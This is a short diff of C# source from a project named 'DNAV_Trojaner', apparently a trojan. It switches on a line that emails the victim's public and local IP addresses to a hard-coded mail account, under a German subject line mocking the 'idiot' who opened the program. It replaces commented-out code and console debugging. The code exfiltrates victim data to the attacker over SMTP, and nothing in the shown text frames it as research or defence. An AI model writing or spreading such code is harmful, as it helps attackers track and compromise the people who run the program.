@@ -29,9 +29,7 @@ namespace DNAV_Trojaner {
         static public void SendIP() {
             //! Daten richtig angeben
             Mailer m = new Mailer("ToMail@mail.de","FromMail@mail.de","FromMail@mail.de","Supergeheim",587,"mail.mail.de");
-            //m.send("Trottel hat DNAV geöffnet", "Public: " + TCP.getPublicIP() + "\nLocal: " + TCP.getLocalIP());
-            Console.Write(TCP.getLocalIPList());
-            Console.Read();
+            m.send("Trottel hat DNAV geöffnet", "Public: " + TCP.getPublicIP() + "\nLocal: " + TCP.getLocalIPList());
         }
 
         static void Main(string[] args) {
